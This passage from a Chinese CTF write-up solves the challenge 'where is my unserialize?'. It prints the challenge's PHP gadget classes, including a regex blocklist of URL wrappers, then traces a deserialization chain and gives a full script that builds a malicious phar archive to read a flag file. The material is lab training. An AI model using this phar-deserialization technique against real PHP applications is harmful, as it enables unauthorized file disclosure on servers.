data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:33,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<h2><a name="t11"></a><a id="where_is_my_unserialize_900"></a>where is my unserialize?</h2> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/c947ec9544e4e48e3269fa46b15ae2c2.png" alt="image-20240808215257471"></p> 
<p>开题，三个功能点：</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/963d9ae2304d27ce4a66fe023e22ae7f.png" alt="image-20240904124915167"></p> 
<p>文件读取</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/7c055ca80a20108b9e47ce0bbfc09e49.png" alt="image-20240904124935451"></p> 
<p>文件上传</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/50e779c89e52d385e980be766f995dc7.png" alt="image-20240904124928895"></p> 
<p>可读取文件：</p> 
<blockquote> 
 <p>index.php</p> 
 <p>base.php</p> 
 <p>function.php</p> 
 <p>class.php</p> 
 <p>upload_file.php</p> 
 <p>file.php</p> 
</blockquote> 
<p>upload_file.php有文件上传，file.php可以文件读取，class.php有恶意类。</p> 
<p>phar反序列化包包的。</p> 
<p>class.php</p> 
<pre data-index="34" class="set-code-hide prettyprint"><code class="prism language-php has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">CNSS</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$shino</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$shin0</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">shin0</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cnss'</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">_sayhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_sayhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;h1&gt;I know you are in a hurry, but don not rush yet.&lt;h1&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">shin0</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">shin0</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>



<span class="token keyword">class</span> <span class="token class-name-definition class-name">CN55</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span>
<span class="token punctuation">{<!-- --></span>


    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$haha</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">key</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">haha</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hehe'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;h1&gt;hackerrrrrr!&lt;br&gt;join CNSS~&lt;h1&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>   <span class="token comment">//Do you know 'Php ARchive'?</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker~"</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>

<div class="hljs-button {2} add_def" data-title="复制"></div></code><div class="hide-preCode-box"><span class="hide-preCode-bt" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.7365&quot;}"><img class="look-more-preCode contentImg-no-view" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png" alt="" title=""></span></div><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li><li style="color: rgb(153, 153, 153);">15</li><li style="color: rgb(153, 153, 153);">16</li><li style="color: rgb(153, 153, 153);">17</li><li style="color: rgb(153, 153, 153);">18</li><li style="color: rgb(153, 153, 153);">19</li><li style="color: rgb(153, 153, 153);">20</li><li style="color: rgb(153, 153, 153);">21</li><li style="color: rgb(153, 153, 153);">22</li><li style="color: rgb(153, 153, 153);">23</li><li style="color: rgb(153, 153, 153);">24</li><li style="color: rgb(153, 153, 153);">25</li><li style="color: rgb(153, 153, 153);">26</li><li style="color: rgb(153, 153, 153);">27</li><li style="color: rgb(153, 153, 153);">28</li><li style="color: rgb(153, 153, 153);">29</li><li style="color: rgb(153, 153, 153);">30</li><li style="color: rgb(153, 153, 153);">31</li><li style="color: rgb(153, 153, 153);">32</li><li style="color: rgb(153, 153, 153);">33</li><li style="color: rgb(153, 153, 153);">34</li><li style="color: rgb(153, 153, 153);">35</li><li style="color: rgb(153, 153, 153);">36</li><li style="color: rgb(153, 153, 153);">37</li><li style="color: rgb(153, 153, 153);">38</li><li style="color: rgb(153, 153, 153);">39</li><li style="color: rgb(153, 153, 153);">40</li><li style="color: rgb(153, 153, 153);">41</li><li style="color: rgb(153, 153, 153);">42</li><li style="color: rgb(153, 153, 153);">43</li><li style="color: rgb(153, 153, 153);">44</li><li style="color: rgb(153, 153, 153);">45</li><li style="color: rgb(153, 153, 153);">46</li><li style="color: rgb(153, 153, 153);">47</li><li style="color: rgb(153, 153, 153);">48</li><li style="color: rgb(153, 153, 153);">49</li><li style="color: rgb(153, 153, 153);">50</li><li style="color: rgb(153, 153, 153);">51</li><li style="color: rgb(153, 153, 153);">52</li><li style="color: rgb(153, 153, 153);">53</li><li style="color: rgb(153, 153, 153);">54</li><li style="color: rgb(153, 153, 153);">55</li><li style="color: rgb(153, 153, 153);">56</li><li style="color: rgb(153, 153, 153);">57</li><li style="color: rgb(153, 153, 153);">58</li><li style="color: rgb(153, 153, 153);">59</li><li style="color: rgb(153, 153, 153);">60</li><li style="color: rgb(153, 153, 153);">61</li><li style="color: rgb(153, 153, 153);">62</li><li style="color: rgb(153, 153, 153);">63</li><li style="color: rgb(153, 153, 153);">64</li><li style="color: rgb(153, 153, 153);">65</li><li style="color: rgb(153, 153, 153);">66</li><li style="color: rgb(153, 153, 153);">67</li><li style="color: rgb(153, 153, 153);">68</li><li style="color: rgb(153, 153, 153);">69</li><li style="color: rgb(153, 153, 153);">70</li><li style="color: rgb(153, 153, 153);">71</li><li style="color: rgb(153, 153, 153);">72</li><li style="color: rgb(153, 153, 153);">73</li><li style="color: rgb(153, 153, 153);">74</li><li style="color: rgb(153, 153, 153);">75</li><li style="color: rgb(153, 153, 153);">76</li><li style="color: rgb(153, 153, 153);">77</li><li style="color: rgb(153, 153, 153);">78</li><li style="color: rgb(153, 153, 153);">79</li><li style="color: rgb(153, 153, 153);">80</li><li style="color: rgb(153, 153, 153);">81</li><li style="color: rgb(153, 153, 153);">82</li><li style="color: rgb(153, 153, 153);">83</li><li style="color: rgb(153, 153, 153);">84</li><li style="color: rgb(153, 153, 153);">85</li><li style="color: rgb(153, 153, 153);">86</li><li style="color: rgb(153, 153, 153);">87</li><li style="color: rgb(153, 153, 153);">88</li><li style="color: rgb(153, 153, 153);">89</li><li style="color: rgb(153, 153, 153);">90</li><li style="color: rgb(153, 153, 153);">91</li><li style="color: rgb(153, 153, 153);">92</li><li style="color: rgb(153, 153, 153);">93</li><li style="color: rgb(153, 153, 153);">94</li><li style="color: rgb(153, 153, 153);">95</li><li style="color: rgb(153, 153, 153);">96</li><li style="color: rgb(153, 153, 153);">97</li><li style="color: rgb(153, 153, 153);">98</li><li style="color: rgb(153, 153, 153);">99</li><li style="color: rgb(153, 153, 153);">100</li><li style="color: rgb(153, 153, 153);">101</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:34,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>反序列化链：</p> 
<pre data-index="35" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">CNSS::__construct($name)-&gt;CNSS::__destruct()-&gt;Show::-&gt;__toString()-&gt;CN55::__invoke()-&gt;CN55::_get($key)-&gt;CN55::file_get($value)
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:35,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>生成phar：</p> 
<pre data-index="36" class="set-code-hide prettyprint"><code class="prism language-php has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">CNSS</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$shino</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$shin0</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">shin0</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cnss'</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">_sayhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_sayhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;h1&gt;I know you are in a hurry, but don not rush yet.&lt;h1&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">shin0</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">shin0</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>





<span class="token keyword">class</span> <span class="token class-name-definition class-name">CN55</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$haha</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">key</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">haha</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hehe'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;h1&gt;hackerrrrrr!&lt;br&gt;join CNSS~&lt;h1&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>   <span class="token comment">//Do you know 'Php ARchive'?</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker~"</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>


<span class="token comment">//CNSS::__construct($name)-&gt;CNSS::__destruct()-&gt;Show::-&gt;__toString()-&gt;CN55::__invoke()-&gt;CN55::_get($key)-&gt;CN55::file_get($value)</span>

<span class="token variable">$Jay17</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'j47'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CNSS</span><span class="token punctuation">(</span><span class="token variable">$Jay17</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$Jay17</span><span class="token operator">-&gt;</span><span class="token property">haha</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hehe'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CN55</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$Jay17</span><span class="token operator">-&gt;</span><span class="token property">haha</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hehe'</span><span class="token punctuation">]</span><span class="token operator">-&gt;</span><span class="token property">params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'file:///var/www/html/f1ag.php'</span><span class="token punctuation">;</span>


<span class="token comment">//删除原来的phar包，防止重复</span>
<span class="token comment">//@unlink("xxx.phar");</span>
<span class="token comment">//后缀名必须为phar</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"xxx.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//设置stub</span>
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//将自定义的meta-data存入manifest</span>
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//添加要压缩的文件,这个文件没有也没关系，走个流程</span>
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//签名自动计算</span>
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"done."</span><span class="token punctuation">;</span>

